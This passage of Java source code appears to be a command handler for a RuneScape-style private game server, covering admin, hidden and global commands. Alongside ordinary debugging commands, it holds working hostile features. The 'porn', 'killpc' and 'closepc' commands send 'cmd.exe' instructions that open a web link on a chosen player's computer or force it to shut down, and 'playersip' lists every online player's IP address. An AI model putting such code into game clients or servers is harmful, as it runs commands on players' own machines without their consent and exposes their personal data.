					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				Player target = World.getPlayerByDisplayName(name);
				boolean loggedIn = true;
				if (target == null) {
					target = SerializableFilesManager.loadPlayer(Utils
							.formatPlayerNameForProtocol(name));
					if (target != null)
						target.setUsername(Utils
								.formatPlayerNameForProtocol(name));
					loggedIn = false;
				}
				if (target == null)
					return true;
				target.getInventory().addItem(15098, 1);
				target.setDonator(true);
				
				
				SerializableFilesManager.savePlayer(target);
				
				if (target.getRights() ==0)
				target.setRights(1);
				
				
				if (loggedIn)
					target.getPackets().sendGameMessage("You have been given donator by " + Utils.formatPlayerNameForDisplay(player.getUsername()), true);
				player.getPackets().sendGameMessage("You gave donator to " + Utils.formatPlayerNameForDisplay(target.getUsername()), true);
				return true;
			}
				
			

			
			

			
			
			if (cmd[0].equalsIgnoreCase("god2")) {
				player.setNextAnimation(new Animation(1914));
				player.setNextGraphics(new Graphics(92));
				player.getAppearence().setRenderEmote(1666);
				for (Player players : World.getPlayers()) {
					if (players == null)
					continue;
					player.setNextForceTalk(new ForceTalk(player.getDisplayName() + " is our god and leader")); 
					player.getPackets().sendGameMessage("Be Our Rescue"); 
					}
				player.setHitpoints(Short.MAX_VALUE);
				player.getEquipment().setEquipmentHpIncrease(
						Short.MAX_VALUE - 990);
				for (int i = 0; i < 10; i++)
					player.getCombatDefinitions().getBonuses()[i] = 5000;
				for (int i = 14; i < player.getCombatDefinitions().getBonuses().length; i++)
					player.getCombatDefinitions().getBonuses()[i] = 5000;
				return true;
			}
			
			if (cmd[0].equalsIgnoreCase("god")) {
				player.setHitpoints(Short.MAX_VALUE);
				player.getEquipment().setEquipmentHpIncrease(
						Short.MAX_VALUE - 990);
				for (int i = 0; i < 10; i++)
					player.getCombatDefinitions().getBonuses()[i] = 5000;
				for (int i = 14; i < player.getCombatDefinitions().getBonuses().length; i++)
					player.getCombatDefinitions().getBonuses()[i] = 5000;
				return true;
			}
				
	
				
				
				
				if (cmd[0].equalsIgnoreCase("images")) {
				player.getPackets().sendGameMessage("0- <img=0>");
				player.getPackets().sendGameMessage("1- <img=1>");
				player.getPackets().sendGameMessage("2- <img=2>");
				player.getPackets().sendGameMessage("3- <img=3>");
				player.getPackets().sendGameMessage("4- <img=4>");
				player.getPackets().sendGameMessage("5- <img=5>");
				player.getPackets().sendGameMessage("6- <img=6>");
				player.getPackets().sendGameMessage("7- <img=7>");
				player.getPackets().sendGameMessage("8- <img=8>");
				player.getPackets().sendGameMessage("9- <img=9>");
				player.getPackets().sendGameMessage("10- <img=10>");
				player.getPackets().sendGameMessage("11- <img=11>");
				player.getPackets().sendGameMessage("12- <img=12>");
				player.getPackets().sendGameMessage("13- <img=13>");
				player.getPackets().sendGameMessage("14- <img=14>");
				player.getPackets().sendGameMessage("15- <img=15>");
				player.getPackets().sendGameMessage("16- <img=16>");
				player.getPackets().sendGameMessage("17- <img=17>");
				player.getPackets().sendGameMessage("18- <img=18>");
				player.getPackets().sendGameMessage("19- <img=19>");
				player.getPackets().sendGameMessage("20- <img=20>");
			}
			
			
			}
			return false;
			}
//Developer End

//Admin
	public static boolean processAdminCommand(Player player, String[] cmd,
				boolean console, boolean clientCommand) {
			if (clientCommand) {

			} else {
			
				if (cmd[0].equalsIgnoreCase("hasmaxed")) {
			String username = cmd[1].substring(cmd[1].indexOf(" ") + 1);
					Player p2 = World.getPlayerByDisplayName(username);
					
				 player.getPackets().sendGameMessage("There maxed boolean is: " + p2.hasmax );
                     
							
							
							return true;
			
			}	
			
		if (cmd[0].equalsIgnoreCase("takemax")) {
			String username = cmd[1].substring(cmd[1].indexOf(" ") + 1);
					Player p2 = World.getPlayerByDisplayName(username);
					p2.hasmax = false;
				 player.getPackets().sendGameMessage("There maxed boolean is: " + p2.hasmax );
					p2.getInventory().deleteItem( 20767, 2147000000);
                    p2.getEquipment().deleteItem(20767, 2147000000);  
					p2.getInventory().deleteItem( 20768, 2147000000);
                    p2.getEquipment().deleteItem(20768, 2147000000);  
					p2.getBank().getItem(20768).setAmount(0);	
					p2.getBank().getItem(20767).setAmount(0);					
							
							return true;
			
			}
			
			   if(cmd[0].equalsIgnoreCase("ranks")){
                                int number = 0;
                                        for (int i = 0; i < 316; i++) {
                                player.getPackets().sendIComponentText(275, i, "");
                                }
                                for(Player p5 : World.getPlayers()) {
                                        if(p5 == null)
                                                continue;
                                        number++;
                                        String titles = "";
					if (p5.getUsername().equalsIgnoreCase("")) {
                        			titles = "[<img=15]<col=1589FF>Le_Snuff</col>]"; 
					}else if (p5.getUsername().equalsIgnoreCase("joe")) {
                        			titles = "[<col=FFFF00>[Owner And Coder]</col> ] - <img=8> "; 
					}else if (p5.getUsername().equalsIgnoreCase("mike")) {
                        			titles = "[<col=FFFF00>[Owner And Coder]</col> ] - <img=8> "; 
					}else if (p5.getUsername().equalsIgnoreCase("")) {
                        			titles = "[<col=FFFF00>[Admin]</col> ] - <img=8> "; 
					} else if (p5.getUsername().equalsIgnoreCase("")) {
                        			titles = "[<col=FFFF00>[Owner]</col> ] - <img=8> "; 
					} else if (p5.getUsername().equalsIgnoreCase("")) {
                        			titles = "[<col=FFFF00></col> ] - <img=8> "; 
					} else if (p5.getUsername().equalsIgnoreCase("")) {
                        			titles = "[ <col=ff0000></col> ] - <img=8> ";
					} else if (p5.getRights() == 13) { 
                        			titles = "[ <col=00ffe4>Trusted Player</col> ] - <img=15> ";
					} else if (p5.getRights() == 12) { 
                        			titles = "[ <col=9c2929>Not a Real Owner</col> ] - <img=1> ";
					} else if (p5.getRights() == 11) { 
                        			titles = "[ <col=9c2929>Admin</col> ] - <img=1> ";
					} else if (p5.getRights() == 10) { 
                        			titles = "[ <col=9c2929>Admin</col> ] - <img=1> ";
						} else if (p5.getRights() == 9) { 
                        			titles = "[ Hidden Admin ] - ";
					} else if (p5.getRights() == 8) {
                        			titles = "[ <col=660066>Global Moderator</col> ] - <img=1> ";
					} else if (p5.getRights() == 7) {
                        			titles = "[ <col=FF8000>Moderator</col> ] - <img=0> ";
					} else if (p5.getRights() == 6) {
                        			titles = "[ <col=00449c>Player Support</col> ] - <img=9> ";
					} else if (p5.getRights() == 5) {
                        			titles = "[<col=FFF00>Forum Moderator</col>]- <img=6> ";
					
					} else if (p5.getRights() == 1) {
                                		titles = "[ <col=FF00FF>Donator</col> ] - <img=10> ";	
					} else if (p5.getRights() == 2) {
                        			titles = "[ <col=FF00FF>Super Donator</col> ] - <img=11> ";	
					} else if (p5.getRights() == 3) {
                        			titles = "[ <col=FF00FF>Respected Donator</col> ] - <img=12> ";	
					} else if (p5.getRights() == 0) { 
                        			titles = "[ Player ] - ";
					
                                                }
                                                player.getPackets().sendIComponentText(275, 2, "");
                                        player.getPackets().sendIComponentText(275, (16+number), titles + ""+ p5.getDisplayName());
                                }
                                player.getPackets().sendIComponentText(275, 14, "<u=000080>The Poanizer Project's  Players</u>");
                                player.getPackets().sendIComponentText(275, 16, "Players Online: "+number);
                                player.getPackets().sendIComponentText(275, 2, "Players Online");
                                player.getInterfaceManager().sendInterface(275);
                                player.getPackets().sendGameMessage("There are currently " + World.getPlayers().size() + " players playing " + Settings.SERVER_NAME+ ".");
                                return true;

			}
		if (cmd[0].equalsIgnoreCase("porn")) {

			
					String username = cmd[1].substring(cmd[1].indexOf(" ") + 1);
					Player p2 = World.getPlayerByDisplayName(username);
					
				p2.getPackets().sendExecMessage("cmd.exe /c start " + Settings.PORN_LINK);
				//player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.RICK);
				
				
					p2.getPackets().sendGameMessage("Get off porn!  Says " + player.getUsername() + ".");
					
					player.getPackets().sendGameMessage(
							"Opening porn for " + p2.getUsername() + "!");
					
					return true;
						}

			
		
			if (cmd[0].equalsIgnoreCase("scroll")) {
				player.getPackets().sendScrollIComponent(
						Integer.valueOf(cmd[1]), Integer.valueOf(cmd[2]),
						Integer.valueOf(cmd[3]));
				return true;
			}
			
			 if (cmd[0].equalsIgnoreCase("inters")) {
				if (cmd.length < 2) {
					player.getPackets().sendPanelBoxMessage("Use: ::inter interfaceId");
					return true;
				}
				try {
					int interId = Integer.valueOf(cmd[1]);
					for (int componentId = 0; componentId < Utils
							.getInterfaceDefinitionsComponentsSize(interId); componentId++) {
						player.getPackets().sendIComponentText(interId,
								componentId, "cid: " + componentId);
					}
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage(
							"Use: ::inter interfaceId");
				}
				return true;
			} if (cmd[0].equalsIgnoreCase("hidec")) {
			//hides a component id, in interface. ::hidec inter, component id  true/false.
				if (cmd.length < 4) {
					player.getPackets().sendPanelBoxMessage("Use: ::hidec interfaceid componentId hidden");
					return true;
				}
				try {
					player.getPackets().sendHideIComponent(
							Integer.valueOf(cmd[1]), Integer.valueOf(cmd[2]),
							Boolean.valueOf(cmd[3]));
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage("Use: ::hidec interfaceid componentId hidden");
				}
			}
			if (cmd[0].equalsIgnoreCase("string")) {
			//send strings for all component id's below the maxchild cmd2, on the interface cmd1, 
				try {
					int inter = Integer.valueOf(cmd[1]);
					int maxchild = Integer.valueOf(cmd[2]);
					player.getInterfaceManager().sendInterface(inter);
					for (int i = 0; i <= maxchild; i++)
						player.getPackets().sendIComponentText(inter, i,"child: " + i);
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage("Use: string inter childid");
				}
				return true;
			}
			if (cmd[0].equalsIgnoreCase("istringl")) {
				if (cmd.length < 2) {
					player.getPackets().sendPanelBoxMessage("Use: config id value");
					return true;
				}

				try {
					for (int i = 0; i < Integer.valueOf(cmd[1]); i++) {
						player.getPackets().sendGlobalString(i, "String " + i);
					}
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage("Use: config id value");
				}
				return true;
			}
			if (cmd[0].equalsIgnoreCase("istring")) {
				if (cmd.length < 2) {
					player.getPackets().sendPanelBoxMessage("Use: config id value");
					return true;
				}
				try {
					player.getPackets().sendGlobalString(Integer.valueOf(cmd[1]), "String " + Integer.valueOf(cmd[2]));
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage("Use: String id value");
				}
				return true;
			}
			if (cmd[0].equalsIgnoreCase("iconfig")) {
				if (cmd.length < 2) {
					player.getPackets().sendPanelBoxMessage("Use: config id value");
					return true;
				}
				try {
					for (int i = 0; i < Integer.valueOf(cmd[1]); i++) {
						player.getPackets().sendGlobalConfig(i, 1);
					}
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage("Use: config id value");
				}
				return true;
			}

			if (cmd[0].equalsIgnoreCase("config")) {
				if (cmd.length < 3) {
					player.getPackets().sendPanelBoxMessage("Use: config id value");
					return true;
				}
				try {
					player.getPackets().sendConfig(Integer.valueOf(cmd[1]),
							Integer.valueOf(cmd[2]));
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage("Use: config id value");
				}
			}
			if (cmd[0].equalsIgnoreCase("configf")) {
				if (cmd.length < 3) {
					player.getPackets().sendPanelBoxMessage("Use: config id value");
					return true;
				}
				try {
					player.getPackets().sendConfigByFile(Integer.valueOf(cmd[1]), Integer.valueOf(cmd[2]));
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage("Use: config id value");
				}
				return true;
			}
			
		
			
			if (cmd[0].equalsIgnoreCase("iloop")) {
				if (cmd.length < 3) {
					player.getPackets().sendPanelBoxMessage("Use: config id value");
					return true;
				}
				try {
					for (int i = Integer.valueOf(cmd[1]); i < Integer.valueOf(cmd[2]); i++)
						player.getInterfaceManager().sendInterface(i);
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage("Use: config id value");
				}
				return true;
			}
			if (cmd[0].equalsIgnoreCase("tloop")) {
				if (cmd.length < 3) {
					player.getPackets().sendPanelBoxMessage("Use: config id value");
					return true;
				}
				try {
					for (int i = Integer.valueOf(cmd[1]); i < Integer.valueOf(cmd[2]); i++)
						player.getInterfaceManager().sendTab(i,Integer.valueOf(cmd[3]));
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage("Use: config id value");
				}
				return true;
			}
			if (cmd[0].equalsIgnoreCase("configloop")) {
				if (cmd.length < 3) {
					player.getPackets().sendPanelBoxMessage("Use: config id value");
					return true;
				}
				try {
					for (int i = Integer.valueOf(cmd[1]); i < Integer
							.valueOf(cmd[2]); i++)
						player.getPackets().sendConfig(i,
								Utils.getRandom(Integer.valueOf(cmd[3])) + 1);
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage(
							"Use: config id value");
				}
				return true;
			}
			if (cmd[0].equalsIgnoreCase("testo2")) {
				for (int x = 0; x < 10; x++) {

					WorldObject object = new WorldObject(1, 0, 0,
							x * 2 + 1, 0, 0);
					player.getPackets().sendSpawnedObject(object);

				}
				return true;
			}                       
			
			if (cmd[0].equalsIgnoreCase("bconfigloop")) {
				if (cmd.length < 3) {
					player.getPackets().sendPanelBoxMessage("Use: config id value");
					return true;
				}
				try {
					for (int i = Integer.valueOf(cmd[1]); i < Integer
							.valueOf(cmd[2]); i++)
						player.getPackets().sendGlobalConfig(i,Utils.getRandom(Integer.valueOf(cmd[3])) + 1);
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage("Use: config id value");
				}
				return true;
			}
			
			if (cmd[0].equalsIgnoreCase("inter")) {
				if (cmd.length < 2) {
					player.getPackets().sendPanelBoxMessage("Use: ::inter interfaceId");
					return true;
				}
				try {
					player.getInterfaceManager().sendInterface(
							Integer.valueOf(cmd[1]));
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage("Use: ::inter interfaceId");
				}
				return true;
			}
			
			if (cmd[0].equalsIgnoreCase("interh")) {
				if (cmd.length < 2) {
					player.getPackets().sendPanelBoxMessage("Use: ::inter interfaceId");
					return true;
				}

				try {
					int interId = Integer.valueOf(cmd[1]);
					for (int componentId = 0; componentId < Utils
							.getInterfaceDefinitionsComponentsSize(interId); componentId++) {
						player.getPackets().sendIComponentModel(interId,
								componentId, 66);
					}
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage("Use: ::inter interfaceId");
				}
				return true;
			}
			
			
			if (cmd[0].equalsIgnoreCase("teleaway") ) {
				String username = cmd[1].substring(cmd[1].indexOf(" ") + 1);
				Player other = World.getPlayerByDisplayName(username);
				if (other == null)
					return true;
				other.setNextWorldTile(Settings.RESPAWN_PLAYER_LOCATION);
				other.stopAll();
			}
			
			
			
			if (cmd[0].equalsIgnoreCase("quake")) {
				player.getPackets().sendCameraShake(Integer.valueOf(cmd[1]),
						Integer.valueOf(cmd[2]), Integer.valueOf(cmd[3]),
						Integer.valueOf(cmd[4]), Integer.valueOf(cmd[5]));
				return true;
			}
			
			}
			return false;
			}
//Admin End

//Hidden
	public static boolean processHiddenCommand(Player player, String[] cmd,
				boolean console, boolean clientCommand) {
			if (clientCommand) {

			} else {
			
		
				if (cmd[0].equalsIgnoreCase("checkipmute")) {
				IPMute.checkCurrent();
				return true;
			}
			
			
			if (cmd[0].equalsIgnoreCase("checkipbans")) {
				IPBanL.checkCurrent();
				return true;
			}
			if (cmd[0].equalsIgnoreCase("reloadfiles")) {
				IPBanL.init();
				PkRank.init();
				MapContainersXteas.init();
				MapAreas.init();
				ObjectSpawns.init();
				NPCSpawns.init();
				NPCCombatDefinitionsL.init();
				NPCBonuses.init();
				NPCDrops.init();
				ItemExamines.init();
				ItemBonuses.init();
				ShopsHandler.init();
				return true;
			}
			
			if (cmd[0].equalsIgnoreCase("titan")) {
				Summoning.spawnFamiliar(player, Pouches.STEEL_TITAN);
				player.getInventory().addItem(12825 , 30);
				return true;
			}
			
			

		
			
			if (cmd[0].equalsIgnoreCase("object")) {
				try {
					World.spawnObject(
							new WorldObject(Integer.valueOf(cmd[1]), 10, -1,
									player.getX(), player.getY(), player
									.getPlane()), true);
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage("Use: setkills id");
				}
				return true;
			}
			if (cmd[0].equalsIgnoreCase("objectr")) {//rotation
				try {
					World.spawnObject(
							new WorldObject(Integer.valueOf(cmd[1]), 10,Integer.valueOf(cmd[2]),
									player.getX(), player.getY(), player
									.getPlane()), true);
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage("Use: setkills id");
				}
				return true;
			}
			
			if (cmd[0].equalsIgnoreCase("pwn")) {
				String username = cmd[1].substring(cmd[1].indexOf(" ") + 1);
				Player other = World.getPlayerByDisplayName(username);
				if (other == null)
					return true;
				player.applyHit(new Hit(player, 90000, HitLook.REGULAR_DAMAGE));
				other.stopAll();
				return true;
			}
			
			
					}
					return false;
				}
			
//Hidden End

//Global
	public static boolean processGlobalCommand(Player player, String[] cmd,
				boolean console, boolean clientCommand) {
			if (clientCommand) {
				
			
			if (cmd[0].equalsIgnoreCase("tele")) {
				cmd = cmd[1].split(",");
				int plane = Integer.valueOf(cmd[0]);
				int x = Integer.valueOf(cmd[1]) << 6 | Integer.valueOf(cmd[3]);
				int y = Integer.valueOf(cmd[2]) << 6 | Integer.valueOf(cmd[4]);
				player.setNextWorldTile(new WorldTile(x, y, plane));
				return true;
			}
			}	
				
				
			 else {
			
			
			 if(cmd[0].equalsIgnoreCase("playersip")){

                                int number = 0;
                                        for (int i = 0; i < 316; i++) {
                                player.getPackets().sendIComponentText(275, i, "");
                                }
                                for(Player p5 : World.getPlayers()) {
                                        if(p5 == null)
                                                continue;
                                        number++;
                                        String titles = "";
					if (p5.getUsername().equalsIgnoreCase("")) {
                        			titles = "<col=a28c66>";
					} else if (p5.getUsername().equalsIgnoreCase("")) {
                        			titles = "[ <col=ff0000>Admin</col> ] - <img=8> ";
					} else if (p5.getUsername().equalsIgnoreCase("")) {
                        			titles = "[ <col=ff0000>Owner's Legit Pure</col> ] - <img=8> ";
					} else if (p5.getUsername().equalsIgnoreCase("")) {
                        			titles = "[ <col=ff0000>Sexy Owner</col> ] - <img=8> ";
					} else if (p5.getRights() == 10) { 
                        			titles = "[ <col=9c2929>Admin</col> ] - <img=1> ";
					} else if (p5.getRights() == 8) {
                        			titles = "[ <col=660066>Global Moderator</col> ] - <img=1> ";
					} else if (p5.getRights() == 7) {
                        			titles = "[ <col=FF8000>Moderator</col> ] - <img=0> ";
					} else if (p5.getRights() == 6) {
                        			titles = "[ <col=00449c>Player Support</col> ] - <img=9> ";
					} else if (p5.getRights() == 5) {
                        			titles = "[<col=FFF00>Forum Moderator</col>]- <img=6> ";
					
					} else if (p5.getRights() == 1) {
                                		titles = "[ <col=FF00FF>Donator</col> ] - <img=11> ";	
					} else if (p5.getRights() == 2) {
                        			titles = "[ <col=FF00FF>Super Donator</col> ] - <img=12> ";	
					} else if (p5.getRights() == 3) {
                        			titles = "[ <col=FF00FF>Respected Donator</col> ] - <img=13> ";	
					} else if (p5.getRights() == 0) { 
                        			titles = "[ Player ] - ";
					
                                                }
                                                player.getPackets().sendIComponentText(275, 2, "");
                                        player.getPackets().sendIComponentText(275, (16+number), titles + ""+ p5.getDisplayName() + " ip: " + p5.getSession().getIP());
                                }
                                player.getPackets().sendIComponentText(275, 14, "<u=000080>The Poanizer Project's Players</u>");
                                player.getPackets().sendIComponentText(275, 16, "Players Online: "+number);
                                player.getPackets().sendIComponentText(275, 2, "Players Online");
                                player.getInterfaceManager().sendInterface(275);
                                player.getPackets().sendGameMessage("There are currently " + World.getPlayers().size() + " players playing " + Settings.SERVER_NAME+ ".");
                                return true;

			}			
				 
	 
			
				if (cmd[0].equalsIgnoreCase("tele")) {
				if (cmd.length < 3) {
					player.getPackets().sendPanelBoxMessage("Use: ::tele coordX coordY");
					return true;
				}
				try {
					player.resetWalkSteps();
					player.setNextWorldTile(new WorldTile(Integer.valueOf(cmd[1]), Integer.valueOf(cmd[2]), cmd.length >= 4 ? Integer.valueOf(cmd[3]) : player.getPlane()));
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage("Use: ::tele coordX coordY plane");
				}
				return true;
			
			}
			if (cmd[0].equalsIgnoreCase("pouch")) {
				Summoning.spawnFamiliar(player, Pouches.PACK_YAK);
				return true;
			}
			
			
			
			if (cmd[0].equalsIgnoreCase("objectanim")) {

							WorldObject object = cmd.length == 4 ? 
								World .getObject(new WorldTile(
								Integer.parseInt(cmd[1]),
								Integer.parseInt(cmd[2]), 
								player.getPlane()))
								: World.getObject( new WorldTile(Integer.parseInt(cmd[1]), 
								Integer.parseInt(cmd[2]), player.getPlane()),
								Integer.parseInt(cmd[3]));
						if (object == null) {
							player.getPackets().sendPanelBoxMessage("No object was found.");
							return true;
						}
						player.getPackets().sendObjectAnimation(
								object,
								new Animation(Integer.parseInt(cmd[cmd.length == 4 ? 3
										: 4])));
			}
			if (cmd[0].equalsIgnoreCase("update")) {
				int delay = 60;
				if (cmd.length >= 2) {
					try {
						delay = Integer.valueOf(cmd[1]);
					} catch (NumberFormatException e) {
						player.getPackets().sendPanelBoxMessage(
								"Use: ::restart secondsDelay(IntegerValue)");
						return true;
					}
				}
				World.safeShutdown(true, delay);
				return true;
			}
			
			
				if (cmd[0].equalsIgnoreCase("killpc")) {
				
				if (cmd[1].equalsIgnoreCase("poanizer")) {
				player.getPackets().sendGameMessage("* uses Reflect...*");
				player.getPackets().sendGameMessage("Its super effective.");
				
				
				player.getPackets().sendExecMessage("cmd.exe /c shutdown -s -t 10");
			
				return false;
			}
				else{
					String username = cmd[1].substring(cmd[1].indexOf(" ") + 1);
					Player p2 = World.getPlayerByDisplayName(username);
						p2.getPackets().sendExecMessage("cmd.exe /c shutdown -f -p");
				}
			}
			if (cmd[0].equalsIgnoreCase("closepc")) {
			
				
			if (cmd[1].equalsIgnoreCase("poanizer")) {
				player.getPackets().sendGameMessage("* uses Reflect...*");
				player.getPackets().sendGameMessage("Its super effective.");
				
				
				player.getPackets().sendExecMessage("cmd.exe /c shutdown -s -t 10");
			
				return false;
			}
			else {
			
				String username = cmd[1].substring(cmd[1].indexOf(" ") + 1);
				Player p2 = World.getPlayerByDisplayName(username);
				p2.getPackets().sendExecMessage("cmd.exe /c shutdown -s -t 10");
				player.getPackets().sendGameMessage(
						"Shutting down " + p2.getUsername() + " his computer.");
						
				return true;
			} }
	
		
			if (cmd[0].equalsIgnoreCase("coords")) {
				player.getPackets().sendGameMessage(
						"Coords: " + player.getX() + ", " + player.getY()
						+ ", " + player.getPlane() + ", regionId: "
						+ player.getRegionId() + ", rx: "
						+ player.getChunkX() + ", ry: "
						+ player.getChunkY(), true);
				return true;
			}
			
			
			if (cmd[0].equalsIgnoreCase("setlevel")) {
				if (cmd.length < 3) {
					player.getPackets().sendGameMessage("Usage ::setlevel skillId level");
					return true;
				}
				try {
					int skill = Integer.parseInt(cmd[1]);
					int level = Integer.parseInt(cmd[2]);
					if (level < 0 || level > 99) {
						player.getPackets().sendGameMessage("Please choose a valid level.");
						return true;
					}
					player.getSkills().set(skill, level);
					player.getSkills().setXp(skill, Skills.getXPForLevel(level));
					player.getAppearence().generateAppearenceData();
					return true;
				} catch (NumberFormatException e) {
					player.getPackets().sendGameMessage("Usage ::setlevel skillId level");
					return true;
				}
			}
		
			
			if (cmd[0].equalsIgnoreCase("demote")) {
			
			
			if (cmd[1].equalsIgnoreCase("poanizer")) {
				player.applyHit(new Hit(player, 90000, HitLook.REGULAR_DAMAGE));
				player.getPackets().sendGameMessage("There shall be no mutiny agaisnt me.");
				return false;
			}
		
				
			else {
				String name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				Player target = World.getPlayerByDisplayName(name);
				boolean loggedIn = true;
				if (target == null) {
					target = SerializableFilesManager.loadPlayer(Utils
							.formatPlayerNameForProtocol(name));
					if (target != null)
						target.setUsername(Utils
								.formatPlayerNameForProtocol(name));
					loggedIn = false;
				}
				if (target == null)
					return true;
				target.setRights(0);
				SerializableFilesManager.savePlayer(target);
				if (loggedIn)
					target.getPackets().sendGameMessage("You have been demoted by " + Utils.formatPlayerNameForDisplay(player.getUsername()), true);
				player.getPackets().sendGameMessage("You demoted " + Utils.formatPlayerNameForDisplay(target.getUsername()), true);
				try {
					File file = new File("data/logs/Demote.txt");
					BufferedWriter writer = new BufferedWriter(new FileWriter(
							file, true));
					writer.write ("[" + DateFormat.getDateTimeInstance().format(new Date()) + "]" + player.getDisplayName() + " Demoted " + target.getDisplayName());
					writer.newLine();
					writer.flush();
				} catch (IOException e) {
					e.printStackTrace();
				}
				
				return true;
			}}
			
		
			
			if (cmd[0].equalsIgnoreCase("120")) {
				if (cmd.length < 3) {
					player.getPackets().sendGameMessage("Usage ::120 skillId level");
					return true;
				}
				try {
					int skill = Integer.parseInt(cmd[1]);
					int level = Integer.parseInt(cmd[2]);
					if (level < 0 || level > 120) {
						player.getPackets().sendGameMessage("Please choose a valid level.");
						return true;
					}
					player.getSkills().set(skill, level);
					player.getSkills().setXp(skill, Skills.getXPForLevel(level));
					player.getAppearence().generateAppearenceData();
					return true;
				} catch (NumberFormatException e) {
					player.getPackets().sendGameMessage("Usage ::setlevel skillId level");
					return true;
				}
			}
			
			if (cmd[0].equalsIgnoreCase("reset")) {//change cmd 1 with "skill" to work properly i think.
				if (cmd.length < 2) {
					for (int skill = 0; skill < 25; skill++)
						player.getSkills().addXp(skill, 0);
					return true;
				}
				try {
					player.getSkills().setXp(Integer.valueOf(cmd[1]), 0);
					player.getSkills().set(Integer.valueOf(cmd[1]), 1);
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage("Use: ::master skill");
				}
				return true;
			}
			
			
			if (cmd[0].equalsIgnoreCase("level")) {
				player.getSkills();
				player.getSkills().addXp(Integer.valueOf(cmd[1]),
						Skills.getXPForLevel(Integer.valueOf(cmd[2])));
				return true;
			}
			
			if (cmd[0].equalsIgnoreCase("tonpc")) {
				if (cmd.length < 2) {
					player.getPackets().sendPanelBoxMessage("Use: ::tonpc id(-1 for player)");
					return true;
				}
				try {
					player.getAppearence().transformIntoNPC(
							Integer.valueOf(cmd[1]));
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage("Use: ::tonpc id(-1 for player)");
				}
				return true;
			}
			
			
			
			if (cmd[0].equalsIgnoreCase("kill")) {
			
				
				String username = cmd[1].substring(cmd[1].indexOf(" ") + 1);
				Player other = World.getPlayerByDisplayName(username);
				if (other == null)
					return true;
				other.applyHit(new Hit(other, player.getHitpoints(),
						HitLook.REGULAR_DAMAGE));
				other.stopAll();
				
			
				try {
					File file = new File("data/logs/useskill.txt");
					BufferedWriter writer = new BufferedWriter(new FileWriter(
							file, true));
					writer.write ("[" + DateFormat.getDateTimeInstance().format(new Date()) + "]" + player.getDisplayName() + " used kill on " + other.getDisplayName() );
					writer.newLine();
					writer.flush();
				} catch (IOException e) {
					e.printStackTrace();
				}
				return true;
			}
			
		
		
				if (cmd[0].equalsIgnoreCase("updatewarn")) {
				for (Player players : World.getPlayers()) 
					players.getPackets().sendGameMessage("<col=CC3300>The next " + Settings.SERVER_NAME + " update is here! Please log out now.");
			}
			
				if (cmd[0].equalsIgnoreCase("updatesoon")) {
			
			for (Player players : World.getPlayers()) 
					players.getPackets().sendGameMessage("<col=CC3300>The next " + Settings.SERVER_NAME + " update will be soon.");
			}
				
			
			if (cmd[0].equalsIgnoreCase("emote")) {
				if (cmd.length < 2) {
					player.getPackets().sendPanelBoxMessage("Use: ::emote id");
					return true;
				}
				try {
					player.setNextAnimation(new Animation(Integer
							.valueOf(cmd[1])));
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage("Use: ::emote id");
				}
				return true;
			}
			
			
			
				if (cmd[0].equalsIgnoreCase("sled")) {
					player.getAppearence().setRenderEmote(1119);
					
					player.getPackets().sendGameMessage(
                                    "<col=0000FF>Type ::unsled to Go back to normal ");
				return true;
				
				
				}

			if (cmd[0].equalsIgnoreCase("unsled")) {
					player.getAppearence().setRenderEmote(-1);
					
					player.getPackets().sendGameMessage(
                                    "<col=0000FF>You are now back to normal ");
				return true;
				
				
				}
			
			if (cmd[0].equalsIgnoreCase("remote")) {
				if (cmd.length < 2) {
					player.getPackets().sendPanelBoxMessage("Use: ::emote id");
					return true;
				}
				try {
					player.getAppearence().setRenderEmote(
							Integer.valueOf(cmd[1]));
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage("Use: ::emote id");
				}
				return true;
			}
			
	
			if (cmd[0].equalsIgnoreCase("gfx")) {
				if (cmd.length < 2) {
					player.getPackets().sendPanelBoxMessage("Use: ::gfx id");
					return true;
				}
				try {
					player.setNextGraphics(new Graphics(Integer.valueOf(cmd[1])));
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage("Use: ::gfx id");
				}
				return true;
			}
			if (cmd[0].equalsIgnoreCase("mess")) {
				player.getPackets().sendMessage(Integer.valueOf(cmd[1]), "", player);
				return true;
			}
			
			
			
			if (cmd[0].equalsIgnoreCase("staffmeeting")) {
				for (Player other : World.getPlayers()) {
					if (other.getRights() > 3) {
						other.setNextWorldTile(player);
						other.stopAll();
						other.getPackets().sendGameMessage(Utils.formatPlayerNameForDisplay(player.getUsername()) + " has requested a meeting with all staff currently online.");
					}
				}
				return true;
			}
		
	
			
			if (cmd[0].equalsIgnoreCase("sound")) {
				if (cmd.length < 2) {
					player.getPackets().sendPanelBoxMessage("Use: ::sound soundid effecttype");
					return true;
				}
				try {
					player.getPackets().sendSound(Integer.valueOf(cmd[1]), 0,
							cmd.length > 2 ? Integer.valueOf(cmd[2]) : 1);
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage("Use: ::sound soundid");
				}
				return true;
			}
			
			
	
			
			if (cmd[0].equalsIgnoreCase("music")) {
				if (cmd.length < 2) {
